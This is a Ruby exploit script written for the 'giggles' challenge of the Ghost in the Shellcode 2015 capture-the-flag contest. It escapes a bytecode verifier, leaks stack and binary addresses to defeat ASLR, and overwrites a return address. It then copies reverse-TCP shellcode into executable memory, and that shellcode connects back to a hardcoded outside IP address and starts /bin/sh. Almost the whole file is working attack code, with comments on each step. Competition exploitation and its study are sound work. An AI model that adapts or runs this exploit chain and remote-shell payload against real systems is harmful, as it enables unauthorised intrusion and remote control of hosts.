#!/usr/bin/ruby

require 'socket'

#SERVER = "localhost"
SERVER = "giggles.2015.ghostintheshellcode.com"
PORT   = 1423

# Port 17476, chosen so I don't have to think about endianness at 7am at night :)
REVERSE_PORT = "\x44\x44"

# 206.220.196.59
REVERSE_ADDR = "\xCE\xDC\xC4\x3B"

# Simple reverse-tcp shellcode I always use
SHELLCODE = "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a" +
"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0" +
"\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24" +
"\x02" + REVERSE_PORT + "\xc7\x44\x24\x04" + REVERSE_ADDR + "\x48\x89\xe6\x6a\x10" +
"\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48" +
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a" +
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54" +
"\x5f\x6a\x3b\x58\x0f\x05"

# The server understand these types of messages
TYPE_ADDFUNC = 0
TYPE_VERIFY  = 1
TYPE_RUNFUNC = 2

# The bytecode has these operations
OP_ADD  = 0
OP_BR   = 1
OP_BEQ  = 2
OP_BGT  = 3
OP_MOV  = 4
OP_OUT  = 5
OP_EXIT = 6

# Create an operation that can be added to the list
def create_op(opcode, arg1 = 0xabababababababab, arg2 = 0xcdcdcdcdcdcdcdcd, arg3 = 0xefefefefefefefef)
  return {
    :opcode => opcode,
    :op1 => arg1,
    :op2 => arg2,
    :op3 => arg3,
  }
end

# This adds a function (an array of opcodes) to the server (create the opcodes with create_op)
# An 'align' value can also be specified, which shifts everything over
def add(s, ops, align = 0)
  puts("[*] Creating a new function on the server with #{ops.length} opcodes")

  # Failsafe
  if(align > 26)
    puts("Alignment offset too much!")
    exit
  end

  packet = "A" * align

  # Encode the ops
  ops.each do |o|
    packet += [o[:opcode], o[:op1], o[:op2], o[:op3]].pack("SQQQ")
  end

  # Pad the end
  if(align > 0)
    packet += "A" * (26 - align)
    packet = [ops.length + 1, 0, 0xCC].pack("SSC") + packet
  else
    # Prepend the length and arg count
    packet = [ops.length, 0, 0xCC].pack("SSC") + packet
  end

  # Prepend the type (add) and the length
  packet = [TYPE_ADDFUNC, packet.length].pack("CS") + packet

  # Send it
  s.write(packet)

  out = s.recv(2) # response length
  out = s.recv(4) # response value

  if(out != "\0\0\0\0")
    puts("[!] Failed to add!")
    exit
  else
    #puts("[*] Successfully added!")
  end
end

# This asks the server to 'verify' a function, which is intended to prevent
# arbitrary bytecode execution
def verify(s, num)
  puts("[*] Attempting to verify function ##{num}...")

  # The packet is simply the number of operations
  packet = [num].pack("S")

  # Add the header
  packet = [TYPE_VERIFY, packet.length].pack("CS") + packet

  # Send it
  s.write(packet)

  # Receive the first two bytes (always \x04\x00)
  s.recv(2)

  # Receive the error code
  out = s.recv(4)
  if(out != "\0\0\0\0")
    puts("[!] Failed to verify!")
    exit
  else
    #puts("[*] Successfully verified!")
  end
end

def execute(s, num, args)
  puts("[*] Attempting to execute function ##{num} with #{args.count} args...")
  packet = ""

  if(args.is_a?(String))
    args = args.bytes.each_slice(4).map { |x| x.join.to_i(16) }
  end

  # Marshall the args
  args.each do |i|
    packet += [i].pack("I")
  end

  # Attach the run header
  packet = [num, args.length].pack("SS") + packet

  # Build the packet
  packet = [TYPE_RUNFUNC, packet.length].pack("CS") + packet

  # Send it
  s.write(packet)

  # Receive the 2-byte length (we just ignore it)
  s.recv(2)

  # Read the body, a space delimited array of printed values
  response = s.recv(1000)

  if(response == "\xFF\xFF\xFF\xFF")
    puts("[!] Failed to execute the function!")
    exit
  else
    #puts(response)
    #puts("[*] Successfully executed the function!")
  end

  return response
end

# This creates a valid-looking bytecode function that jumps out of bounds,
# then a non-validated function that puts us in a more usable bytecode
# escape
def init()
  puts("[*] Connecting to #{SERVER}:#{PORT}")
  s = TCPSocket.new(SERVER, PORT)
  #puts("[*] Connected!")

  ops = []

  # This branches to the second instruction - which doesn't exist
  ops << create_op(OP_BR, 1)
  add(s, ops)
  verify(s, 0)

  # This little section takes some explaining. Basically, we've escaped the bytecode
  # interpreter, but we aren't aligned properly. As a result, it's really irritating
  # to write bytecode (for example, the code of the first operation is equal to the
  # number of operations!)
  #
  # Because there are 4 opcodes below, it performs opcode 4, which is 'mov'. I ensure
  # that both operands are 0, so it does 'mov reg0, reg0'.
  #
  # After that, the next one is a branch (opcode 1) to offset 3, which effectively
  # jumps past the end and continues on to the third set of bytecode, which is out
  # ultimate payload.

  ops = []
  # (operand = count)
  #                  |--|               |---|                                          <-- inst1 operand1 (0 = reg0)
  #                          |--------|                    |----|                      <-- inst1 operand2 (0 = reg0)
  #                                                                        |--|        <-- inst2 opcode (1 = br)
  #                                                                  |----|            <-- inst2 operand1
  ops << create_op(0x0000, 0x0000000000000000, 0x4242424242000000, 0x00003d0001434343)
  #                  |--|              |----|                                          <-- inst2 operand1
  ops << create_op(0x0000, 0x4444444444000000, 0x4545454545454545, 0x4646464646464646)
  # The values of these don't matter, as long as we still have 4 instructions
  ops << create_op(0xBBBB, 0x4747474747474747, 0x4848484848484848, 0x4949494949494949)
  ops << create_op(0xCCCC, 0x4a4a4a4a4a4a4a4a, 0x4b4b4b4b4b4b4b4b, 0x4c4c4c4c4c4c4c4c)

  # Add them
  add(s, ops)

  return s
end

# This function leaks two addresses: a stack address and the address of
# the binary image (basically, defeating ASLR)
def leak_addresses()
  puts("[*] Bypassing ASLR by leaking stack/binary addresses")
  s = init()

  # There's a stack address at offsets 24/25
  ops = []
  ops << create_op(OP_OUT, 24)
  ops << create_op(OP_OUT, 25)

  # 26/27 is the return address, we'll use it later as well!
  ops << create_op(OP_OUT, 26)
  ops << create_op(OP_OUT, 27)

  # We have to cleanly exit
  ops << create_op(OP_EXIT)

  # Add the list of ops, offset by 10 (that's how the math worked out)
  add(s, ops, 16)

  # Run the code
  result = execute(s, 0, [])

  # The result is a space-delimited array of hex values, convert it to
  # an array of integers
  a = result.split(/ /).map { |str| str.to_i(16) }

  # Read the two values in and do the math to calculate them
  @@registers = ((a[1] << 32) | (a[0])) - 0xc0
  @@base_addr = ((a[3] << 32) | (a[2])) - 0x1efd

  # User output
  puts("[*] Found the base address of the register array: 0x#{@@registers.to_s(16)}")
  puts("[*] Found the base address of the binary: 0x#{@@base_addr.to_s(16)}")

  s.close
end

def leak_rwx_address()
  puts("[*] Attempting to leak the address of the mmap()'d +rwx memory...")
  s = init()

  # This offset is always constant, from the binary
  jit_ptr = @@base_addr + 0x20f5c0

  # Read both halves of the address - the read is relative to the stack-
  # based register array, and has a granularity of 4, hence the math
  # I'm doing here
  ops = []
  ops << create_op(OP_OUT, (jit_ptr - @@registers) / 4)
  ops << create_op(OP_OUT, ((jit_ptr + 4) - @@registers) / 4)
  ops << create_op(OP_EXIT)
  add(s, ops, 16)
  result = execute(s, 0, [])

  # Convert the result from a space-delimited hex list to an integer array
  a = result.split(/ /).map { |str| str.to_i(16) }

  # Read the address
  @@rwx_addr = ((a[1] << 32) | (a[0]))

  # User output
  puts("[*] Found the +rwx memory: 0x#{@@rwx_addr.to_s(16)}")

  s.close
end

def do_sploit()
  puts("[*] Attempting to run the actual exploit")
  s = init()

  ops = []

  # Overwrite teh reteurn address with the first two operations
  ops << create_op(OP_MOV, 26, 1)
  ops << create_op(OP_MOV, 27, 2)

  # This next bunch copies shellcode from the arguments into the +rwx memory
  ops << create_op(OP_MOV, ((@@rwx_addr + 0) - @@registers) / 4, 3)
  ops << create_op(OP_MOV, ((@@rwx_addr + 4) - @@registers) / 4, 4)
  ops << create_op(OP_MOV, ((@@rwx_addr + 8) - @@registers) / 4, 5)
  ops << create_op(OP_MOV, ((@@rwx_addr + 12) - @@registers) / 4, 6)
  ops << create_op(OP_MOV, ((@@rwx_addr + 16) - @@registers) / 4, 7)
  ops << create_op(OP_MOV, ((@@rwx_addr + 20) - @@registers) / 4, 8)
  ops << create_op(OP_MOV, ((@@rwx_addr + 24) - @@registers) / 4, 9)

  # Create some loader shellcode. I'm not proud of this - it was 7am, and I hadn't
  # slept yet. I immediately realized after getting some sleep that there was a
  # way easier way to do this...
  params =
    # param0 gets overwritten, just store crap there
    "\x41\x41\x41\x41" +

    # param1 + param2 are the return address
    [@@rwx_addr & 0x00000000FFFFFFFF, @@rwx_addr >> 32].pack("II") +

    # ** Now, we build up to 16 bytes of shellcode that'll load the actual shellcode

    # Decrease ECX to a reasonable number (somewhere between 200 and 10000, doesn't matter)
    "\xC1\xE9\x10" +  # shr ecx, 10

    # This is where the shellcode is read from - to save a couple bytes (an absolute move is 10
    # bytes long!), I use r12, which is in the same image and can be reached with a 4-byte add
    "\x49\x8D\xB4\x24\x88\x2B\x20\x00" + # lea rsi,[r12+0x202b88]

    # There is where the shellcode is copied to - immediately after this shellcode
    "\x48\xBF" + [@@rwx_addr + 24].pack("Q") + # mov rdi, @@rwx_addr + 24

    # And finally, this moves the bytes over
    "\xf3\xa4" # rep movsb

  # Pad the shellcode with NOP bytes so it can be used as an array of ints
  while((params.length % 4) != 0)
    params += "\x90"
  end

  # Convert the shellcode to an array of ints
  params = params.unpack("I*")

  # We have to exit cleanly for this to work
  ops << create_op(OP_EXIT)

  add(s, ops, 16)

  # Pad the shellcode to the proper length
  shellcode = SHELLCODE
  while((shellcode.length % 26) != 0)
    shellcode += "\xCC"
  end

  # Now we create a new function, which simply stores the actual shellcode.
  # Because this is a known offset, we can copy it to the +rwx memory with
  # a loader
  ops = []

  # Break the shellcode into 26-byte chunks (the size of an operation)
  shellcode.chars.each_slice(26) do |slice|
    # Make the character array into a string
    slice = slice.join

    # Split it into the right proportions
    a, b, c, d = slice.unpack("SQQQ")

    # Add them as a new operation
    ops << create_op(a, b, c, d)
  end

  # Add the operations to a new function (no offset, since we just need to
  # get it stored, not run as bytecode)
  add(s, ops, 16)

  # Execute function 0, which will do the entire exploit
  puts("[*] Triggering the exploit. Good luck!")
  execute(s, 0, params)
  s.close
end

# Leak important addresses
leak_addresses()

# Leak more important addresses
leak_rwx_address()

# Run the exploit
do_sploit()
